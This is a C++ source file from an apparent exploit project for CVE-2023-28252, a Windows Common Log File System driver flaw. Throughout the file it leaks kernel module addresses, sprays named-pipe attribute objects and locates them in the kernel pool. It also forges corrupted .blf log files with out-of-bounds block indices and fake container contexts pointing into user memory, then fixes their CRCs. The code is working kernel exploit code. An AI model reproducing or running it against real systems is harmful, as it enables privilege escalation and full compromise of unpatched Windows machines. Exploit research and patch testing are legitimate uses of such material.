/*
 * @Date: 2026-11-09 08:46:23
 * @LastEditors: joe1sn joe1sn23333@gmail.com
 * @LastEditTime: 2026-11-12 14:14:42
 * @FilePath: \CVE_2023_28252\exp\CVE_2023_28252\def.cpp
 */
#include "def.hpp"
#include <string>
#include <Windows.h>
#include <random>
#include <string>
#include <random>
#include <string>
#include <sstream>
#include <iomanip>
#include <string>
#include <fstream>
namespace CVE_2023_28252
{
    static std::mt19937_64& GetRandomEngine()
    {
        thread_local std::mt19937_64 engine{ std::random_device{}() };
        return engine;
    }

    std::wstring RandomUIntWString(uint64_t min, uint64_t max,
        int precision, int base)
    {
        std::uniform_int_distribution<uint64_t> dist(min, max);
        uint64_t value = dist(GetRandomEngine());

        std::wostringstream oss;
        oss.imbue(std::locale::classic());

        if (base == 16) oss << std::hex << std::uppercase;
        else if (base == 8)  oss << std::oct;

        if (precision > 0)
            oss << std::setw(precision) << std::setfill(L'0');

        oss << value;
        return oss.str();
    }


    int crcCalculatorAndFix(char* mybuf, int mysize) {


        uint32_t table[256];
        crc32::generate_table(table);

        // Struct, for piece-by-piece, bytewise
        struct DataStruct {
            uint16_t data1;
            uint16_t data2;
            float mypi;
            uint32_t myclock;
            bool begun;
        };



        char* ptr = (char*)mybuf;
        uint16_t slen = mysize;


        uint32_t CRC = 0;
        for (int cnt = 0; cnt < slen; cnt++) {
            CRC = crc32::update(table, CRC, ptr, 1);
            ptr++;
        }
        return CRC;
    }

    bool fixCRCFile(std::wstring filepath) {
        /*
        +0x0000 Control Block
        +0x0400 Control Block Shadow
        +0x0800 Base Block
        +0x8200 Base Block Shadow
        +0xFC00 Truncate Block
        +0xFE00 Truncate Block Shadow
        */

        DWORD numread = 0;
        char* ctrlBlock = new char[NormalBlockSize];
        char* ctrlBlockShadow = new char[NormalBlockSize];
        char* baseBlock = new char[BaseBlockSize];
        char* baseBlockShadow = new char[BaseBlockSize];

        HANDLE hFile = CreateFileW(filepath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            return false;
        }

        //--------------------------------------------------------------------

        SetFilePointer(hFile, 0x0, NULL, FILE_BEGIN);
        ReadFile(hFile, ctrlBlock, NormalBlockSize, &numread, NULL);
        *((DWORD*)(ctrlBlock + 0xc)) = 0;
        uint32_t CRC = crcCalculatorAndFix(ctrlBlock, NormalBlockSize);

        //--------------------------------------------------------------------

        SetFilePointer(hFile, 0x400, NULL, FILE_BEGIN);
        ReadFile(hFile, ctrlBlockShadow, NormalBlockSize, &numread, NULL);
        *((DWORD*)(ctrlBlockShadow + 0xc)) = 0;

        if (numread != NormalBlockSize)
        {
            printf("ERROR2\n");
            CloseHandle(hFile);
            return false;
        }

        uint32_t CRC1 = crcCalculatorAndFix(ctrlBlockShadow, NormalBlockSize);

        //--------------------------------------------------------------------

        SetFilePointer(hFile, 0x800, NULL, FILE_BEGIN);
        ReadFile(hFile, baseBlock, BaseBlockSize, &numread, NULL);
        *((DWORD*)(baseBlock + 0xc)) = 0;

        if (numread != BaseBlockSize)
        {
            printf("ERROR3\n");
            CloseHandle(hFile);
            return false;
        }

        uint32_t CRC2 = crcCalculatorAndFix(baseBlock, BaseBlockSize);

        //--------------------------------------------------------------------

        SetFilePointer(hFile, 0x8200, NULL, FILE_BEGIN);
        ReadFile(hFile, baseBlockShadow, BaseBlockSize, &numread, NULL);
        *((DWORD*)(baseBlockShadow + 0xc)) = 0;

        if (numread != BaseBlockSize)
        {
            printf("ERROR4\n");
            CloseHandle(hFile);
            return false;
        }

        uint32_t CRC3 = crcCalculatorAndFix(baseBlockShadow, BaseBlockSize);

        SetFilePointer(hFile, 0xc, NULL, FILE_BEGIN);
        WriteFile(hFile, &CRC, 4, &numread, NULL);
        SetFilePointer(hFile, 0x40c, NULL, FILE_BEGIN);
        WriteFile(hFile, &CRC1, 4, &numread, NULL);
        SetFilePointer(hFile, 0x80c, NULL, FILE_BEGIN);
        WriteFile(hFile, &CRC2, 4, &numread, NULL);
        SetFilePointer(hFile, 0x820c, NULL, FILE_BEGIN);
        WriteFile(hFile, &CRC3, 4, &numread, NULL);

        CloseHandle(hFile);

        delete[] ctrlBlock;
        delete[] ctrlBlockShadow;
        delete[] baseBlock;
        delete[] baseBlockShadow;
        return true;
    }

    void getVirtualFunction() {

        auto kClfsBase = exploit::memtools::ulGetKernelBase((PCHAR)"CLFS.SYS");
        if (!kClfsBase) {
            std::cout << "[x] Can't leak CLFS.sys kernel base address, exit\n";
            exit(1);
        }
        printf("[+] CLFS.sys Kernel Base: 0x%p\n", kClfsBase);

        auto kNtBase = exploit::memtools::ulGetKernelBase((PCHAR)"ntoskrnl.exe");
        if (!kNtBase) {
            std::cout << "[x] Can't leak ntoskrnl.exe kernel base address, exit\n";
            exit(1);
        }
        printf("[+] ntoskrnl.exe Kernel Base: 0x%p\n", kNtBase);

        HMODULE CLFS_userBase = LoadLibraryExW(L"C:\\Windows\\System32\\drivers\\CLFS.SYS", 0, 1);
        if (!CLFS_userBase)
        {
            std::cout << "[x] Can't loadlibrary CLFS.sys, exit\n";
            exit(1);
        }
        auto user_ClfsEarlierLsn = GetProcAddress(CLFS_userBase, "ClfsEarlierLsn");
        auto user_ClfsMgmtDeregisterManagedClient = GetProcAddress(CLFS_userBase, "ClfsMgmtDeregisterManagedClient");

        auto offset_ClfsEarlier = (UINT64)user_ClfsEarlierLsn - (UINT64)CLFS_userBase;
        auto offset_ClfsMgmtDeregisterManagedClient = (UINT64)user_ClfsMgmtDeregisterManagedClient - (UINT64)CLFS_userBase;

        fnClfsEarlierLsn = kClfsBase + offset_ClfsEarlier;
        fnClfsMgmtDeregisterManagedClient = kClfsBase + offset_ClfsMgmtDeregisterManagedClient;
        printf("[+] ClfsEarlierLsn Kernel Base: 0x%p\n", fnClfsEarlierLsn);
        printf("[+] ClfsMgmtDeregisterManagedClient Kernel Base: 0x%p\n", fnClfsMgmtDeregisterManagedClient);

        HMODULE ntos_userBase = LoadLibraryExW(L"ntoskrnl.exe", 0, 1);
        if (!ntos_userBase)
        {
            std::cout << "[x] Can't loadlibrary ntoskrnl.exe, exit\n";
            exit(1);
        }

        auto user_PoFxProcessorNotification = GetProcAddress(ntos_userBase, "PoFxProcessorNotification");
        auto user_SeSetAccessStateGenericMapping = GetProcAddress(ntos_userBase, "SeSetAccessStateGenericMapping");
        auto offset_PoFxProcessorNotification = (UINT64)user_PoFxProcessorNotification - (UINT64)ntos_userBase;
        auto offset_SeSetAccessStateGenericMapping = (UINT64)user_SeSetAccessStateGenericMapping - (UINT64)ntos_userBase;

        fnSeSetAccessStateGenericMapping = kNtBase + offset_SeSetAccessStateGenericMapping;
        fnPoFxProcessorNotification = kNtBase + offset_PoFxProcessorNotification;
        printf("[+] fnSeSetAccessStateGenericMapping Kernel Base: 0x%p\n", fnSeSetAccessStateGenericMapping);
        printf("[+] fnPoFxProcessorNotification Kernel Base: 0x%p\n", fnPoFxProcessorNotification);
    }


    void getVirtualAddress() {
        std::cout << "\nVIRTUAL ADDRESSES AND OFFSETS\n";

        HMODULE ntbase = LoadLibraryA("ntdll.dll");
        if (!ntbase) {
            std::cerr << "[!] LoadLibrary failed with error " << std::hex << GetLastError() << "\n";
            exit(1);
        }

        fnNtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntbase, "NtQuerySystemInformation");
        NtFsControlFile = (PNtFsControlFile)GetProcAddress(ntbase, "NtFsControlFile");
        if (!fnNtQuerySystemInformation || !NtFsControlFile) exit(1);

        std::cout << "[+] NtFsControlFile Address --> " << (void*)NtFsControlFile << "\n";

        // 1. 创建管道
        if (!CreatePipe(&g_VictimPipes.r, &g_VictimPipes.w, 0, 0x1000)) {
            exit(0);
        }

        // 2. 准备写入管道的数据
        // 使用 new 分配 UINT64 数组，长度为 0x2000 / 8，且不抛异常
        auto temp_chunk = new (std::nothrow) UINT64[0x2000 / sizeof(UINT64)];
        if (temp_chunk == nullptr) { exit(0); }

        // 初始化为 0
        memset(temp_chunk, 0, 0x2000);
        memset((UINT64*)temp_chunk + 1, 0x41, 0xffe);
        *(UINT64*)temp_chunk = 0x5a; // 首字节 0x5a ('Z')

        // 使用 new 分配 BYTE 数组（局部变量，用完即毁）
        BYTE* dest = new (std::nothrow) BYTE[0x100];
        if (dest == nullptr) { exit(0); }
        memset(dest, 0x42, 0xff);

        // 3. 触发内核分配 NpAt 对象
        IO_STATUS_BLOCK status_block = { 0 };
        NtFsControlFile(g_VictimPipes.w, 0, 0, 0, &status_block, 0x11003c, temp_chunk, 0xfd8, dest, 0x100);

        // dest 仅仅是作为 NtFsControlFile 的输出缓冲区，用完即可释放
        delete[] dest;
        dest = nullptr;

        // =========================================================
        // 4. 体面的核心：直接调用封装好的函数进行检索
        // =========================================================
        std::vector<UINT64> foundAddrs(0x100, 0);
        size_t count = exploit::memtools::ulFindKernelPoolAddress('tApN', 0, foundAddrs.data(), 0x100);

        if (count > 0) {
            para_PipeAttributeobjInkernel = foundAddrs[0];
            std::cout << "[+] pool NpAt VirtualAddress --> " << (void*)para_PipeAttributeobjInkernel << "\n";
        }
        else {
            std::cerr << "[!] Failed to find NpAt pool address.\n";
            exit(1);
        }
    }

    void craftTriggerFile(std::wstring filepath) {
        const char RecordOffset12[] = { 0x69, 0x03 }; // offset 0x858 RecordOffset[12d] to 0x369
        const char data1[] = { 0xa0, 0x15 }; // offset 0x1dd0 to 0x15a0
        const char data2[] = { 0x70, 0x15 }; // offset 0x1dd4 to 0x1570
        const char data3[] = { 0x08, 0xf0, 0xfd, 0xc1 }; // offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008
        const char data4[] = { 0x30, 0x00 }; // offset 0x1de4  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cbNode is the size of the container (to 0x30)
        const char data5[] = { 0x00, 0x00, 0x00, 0x05 }; // [HERE] offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContainer
        const char data6[] = { 0x58, 0x18 }; // offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContaine
        const char data7[] = { 0x88, 0x18 }; // offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContaine

        std::fstream fs(filepath.c_str(), std::ios::in | std::ios::out | std::ios::binary);
        if (!fs) {
            DWORD error = GetLastError();
            std::cout << "[x] Change log file failed: " << std::hex << error << std::dec << "\n";
            exit(-1);
        }

        std::cout << "[+] Forge vuln trigger blf file\n";
        //CLFS_LOG_BLOCK_HEADER* pBlockHeader = (CLFS_LOG_BLOCK_HEADER*)(fileBuffer + 0x800);
        fs.seekp(0x858);
        fs.write(RecordOffset12, sizeof(RecordOffset12));
        //pBlockHeader->RecordOffsets[12] = 0x369;
        //CLFS_BASE_RECORD_HEADER* pBaseRecord = (CLFS_BASE_RECORD_HEADER*)(fileBuffer + 0x870);
        //recordOffset = index_overflow_here->RecordOffsets[0] = 0x30+0x369=0x399;
        //++*(CLFS + recordOffset) = ++*(CLFS + 0x399) 
        // rgContainers[0] 的第二字节 +1，即 rgContainers[0]+=0x100;

        fs.seekp(0x1dd0);
        fs.write(data1, sizeof(data1));// offset 0x1dd0
        // CLFSHASHSYM* pFakeSym1 = (CLFSHASHSYM*)((unsigned char*)pBaseRecord + 0x1560);
        // pFakeSym1->cbSymName = 0x15A0; // 对应 offset 0x1dd0

        fs.seekp(0x1dd4);
        fs.write(data2, sizeof(data2));// offset 0x1dd4
        // pFakeSym1->cbOffset  = 0x1570; // 对应 offset 0x1dd4

        //CLFS_CONTAINER_CONTEXT* pFakeCtx1 = (CLFS_CONTAINER_CONTEXT*)(fileBuffer + 0x1DE0);
        fs.seekp(0x1de0);
        fs.write(data3, sizeof(data3));

        fs.seekp(0x20b8);
        fs.write(data7, sizeof(data7));

        fs.seekp(0x20bc);
        fs.write(data6, sizeof(data6));

        fs.seekp(0x20c8);
        fs.write(data3, sizeof(data3));

        fs.seekp(0x20cc);
        fs.write(data4, sizeof(data4));

        fs.seekp(0x20e0);
        fs.write(data5, sizeof(data5)); // 0x05000000（用户态伪造对象）offset 0x1de0 write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

        fs.seekp(0x1de4);
        fs.write(data4, sizeof(data4)); // offset 0x1de4  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cbNode is the size of the container (to 0x30)

        fs.seekp(0x1df8);
        fs.write(data5, sizeof(data5)); //0x05000000（用户态伪造对象）  offset 0x1df8  to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContainer 

        fs.seekp(0x8258);
        fs.write(RecordOffset12, sizeof(RecordOffset12)); // offset 0x8258 RecordOffset[12d] to 0x369

        fs.seekp(0x97d0);
        fs.write(data1, sizeof(data1));// offset 0x97d0 to 0x15a0

        fs.seekp(0x97d4);
        fs.write(data2, sizeof(data2));// offset 0x97d4 to 0x1570

        fs.seekp(0x97e0);
        fs.write(data3, sizeof(data3)); // offset 0x97e0 shadow block write to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cType the value CLFS_NODE_TYPE_CONTAINER_CONTEXT = 0xC1FDF008

        fs.seekp(0x97e4);
        fs.write(data4, sizeof(data4)); // offset 0x97e4  shadow block to a fake _CLFS_CONTAINER_CONTEXT.cidNode.cbNode is the size of the container (to 0x30)

        fs.seekp(0x97f8);
        fs.write(data5, sizeof(data5)); // offset 0x1df8  shadow block to a fake _CLFS_CONTAINER_CONTEXT.cidNode.pContainer
        fs.flush();
    }

    void craftSprayFile(std::wstring filepath) {

        const char ValidSectorCount[] = { 0x01, 0x00 }; // offset 0x6 ValidSectorCount
        const char ullDumpCount[] = { 0x02, 0x00 }; // offset 0x70 ullDumpCount
        const char eExtendState[] = { 0x02, 0x00 }; // offset 0x84 eExtendState
        const char iExtendBlock[] = { 0x04, 0x00 }; // offset 0x88 iExtendBlock
        const char iFlushBlock[] = { 0x04, 0x00 }; // offset 0x8a iFlushBlock
        const char cExtendStartSectors[] = { 0x01, 0x00 }; // offset 0x90 cExtendStartSectors
        const char cExtendSectors[] = { 0x03, 0x00 }; // offset 0x94 cExtendSectors
        const char cClients[] = { 0x02, 0x00 }; // offset 0x9c cClients
        const char cbsymbolZone[] = { 0xc8, 0x65 }; // offset 0x1b98 cbsymbolZone for windows 11 and 10
        const char rawData[512] = {
            0x15, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,
            0xFF, 0xFF, 0xFF, 0xFF, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x03, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x1C, 0x5F, 0x00, 0x00, 0xF5, 0xC1, 0xF5, 0xC1, 0x01, 0x00, 0x00, 0x00,
            0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
            0x00, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00,
            0x00, 0x08, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00,
            0x00, 0x82, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
            0x00, 0xFC, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
            0x00, 0xFE, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x01
        };

        std::fstream fs(filepath.c_str(), std::ios::in | std::ios::out | std::ios::binary);
        if (!fs) {
            DWORD error = GetLastError();
            std::cout << "[x] Change log file failed: " << std::hex << error << std::dec << "\n";
            exit(-1);
        }

        std::wcout << L"[+] Forge vuln spray blf file:" << filepath << "\n";

        fs.seekp(0x400);
        fs.write(rawData, sizeof(rawData)); //build a valid header in shadow

        const char rawdata2[] = { 0x30, 0x01 }; // offset 0x1b98 cbsymbolZone for windows 11 and 10

        fs.seekp(0x7fe);
        fs.write(rawdata2, sizeof(rawdata2)); //build a valid header in shadow

        fs.seekp(0x6);
        fs.write(ValidSectorCount, sizeof(ValidSectorCount)); //ValidSectorCount to 1


        fs.seekp(0x70);
        fs.write(ullDumpCount, sizeof(ullDumpCount)); //ullDumpCount to 2

        fs.seekp(0x84);
        fs.write(eExtendState, sizeof(eExtendState)); //changing the eExtendState to 2 (ClfsExtendStateFlushingBlock) 

        fs.seekp(0x88);
        fs.write(iFlushBlock, sizeof(iFlushBlock)); //changing the iExtendBlock to 4 

        fs.seekp(0x8A);
        fs.write(iFlushBlock, sizeof(iFlushBlock)); //changing the iFlushBlock to 4 

        fs.seekp(0x90);
        fs.write(cExtendStartSectors, sizeof(cExtendStartSectors)); //changing the cExtendStartSectors to 1 

        fs.seekp(0x94);
        fs.write(cExtendSectors, sizeof(cExtendSectors)); //changing the cExtendSectors to 3

        fs.seekp(0x9c);
        fs.write(cClients, sizeof(cClients)); //changing the cClients to 2

        fs.seekp(0x484);
        fs.write(eExtendState, sizeof(eExtendState)); //changing the eExtendState of the shadow block to 2 (ClfsExtendStateFlushingBlock) 

        const char iExtendBlock2[] = { 0x0, 0x00 }; // offset 0x488 iExtendBlock2
        const char iFlushBlock2[] = { 0x13, 0x00 }; // offset 0x48a iFlushBlock2, causing oob-----------[VULN][VULN][VULN][VULN][VULN][VULN][VULN][VULN][VULN][VULN][VULN][VULN]

        fs.seekp(0x488);
        fs.write(iExtendBlock2, sizeof(iExtendBlock2)); //changing the iExtendBlock of the shadow block to 13 

        fs.seekp(0x48A);
        fs.write(iFlushBlock2, sizeof(iFlushBlock2)); //changing the iFlushBlock of the shadow block to 13 

        fs.seekp(0x1b98);
        fs.write(cbsymbolZone, sizeof(cbsymbolZone)); // changing the cbsymbolZone to 0x65c8

        fs.seekp(0x9598);
        fs.write(cbsymbolZone, sizeof(cbsymbolZone)); //changing the cbsymbolZone to of the shadow 0x65c8
        fs.flush();

        return;
    }

} // namespace CVE_2023_28252